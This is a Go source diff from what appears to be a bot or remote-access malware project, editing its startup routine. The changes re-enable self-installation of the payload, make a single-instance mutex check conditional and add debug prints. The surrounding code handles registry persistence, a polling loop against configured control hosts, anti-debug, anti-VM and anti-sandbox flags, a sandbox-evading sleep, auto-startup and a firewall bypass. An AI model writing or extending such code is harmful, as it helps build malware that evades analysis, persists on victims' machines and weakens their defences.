@@ -2,6 +2,7 @@ package components
 
 import (
 	"encoding/json"
+	"fmt"
 	"io"
 	"log"
 	"os"
@@ -141,7 +142,7 @@ func auth_bot_poll(state BotState, host string) BotState {
 			next_state = StateReadToken
 		}
 	case StateGenGuid:
-		g_guid = generate_guid()
+		g_guid = get_guid_hash()
 		if len(g_guid) > 0 {
 			if reg_create_or_update_value(registry.CURRENT_USER, g_regpath, "guid", g_guid, true) {
 				// Save installdate
@@ -265,19 +266,36 @@ func read_config() bool {
 	botcore.use_ssl = build_config.Use_ssl
 	botcore.version = build_config.Version
 	botcore.hosts = build_config.Host
+	//fmt.Println("singleton: ", botcore.singleton, "antidebug: ", botcore.anti_debug, "antisandbox: ", botcore.anti_sandbox, "antivm: ", botcore.anti_vm,
+	//	"mutex: ", botcore.mutex_name, "delay: ", botcore.delay, "use_ssl: ", botcore.use_ssl, "version: ", botcore.version, "host: ", botcore.hosts)
+	//if botcore.install {
+	//	fmt.Println("install file: ", botcore.install_file)
+	//}
+	//bufio.NewReader(os.Stdin).ReadString('\n')
 
 	return true
 }
 
 func Run() {
 	// Read configure
-	if !read_config() {
-		os.Exit(0)
-	}
+	//if !read_config() {
+	//	os.Exit(0)
+	//}
+	//
+	//if botcore.install {
+	//	install_payload()
+	//}
 
 	// Check singleton
-	if is_already_exist(botcore.mutex_name) {
-		os.Exit(0)
+	if botcore.singleton {
+		run, m := is_already_exist(botcore.mutex_name)
+		if run {
+			fmt.Println("Already exist")
+			fmt.Scan()
+			os.Exit(0)
+		}
+		botcore.sington_mutex = m
+		fmt.Println("Singleton")
 	}
 
 	// Sleep for avoiding the detection of sandbox
@@ -297,9 +315,9 @@ func Run() {
 	}
 
 	// Install self
-	// if botcore.install {
-	// 	install_payload()
-	// }
+	if botcore.install {
+		install_payload()
+	}
 
 	// Set auto startup and set firewall bypass
 
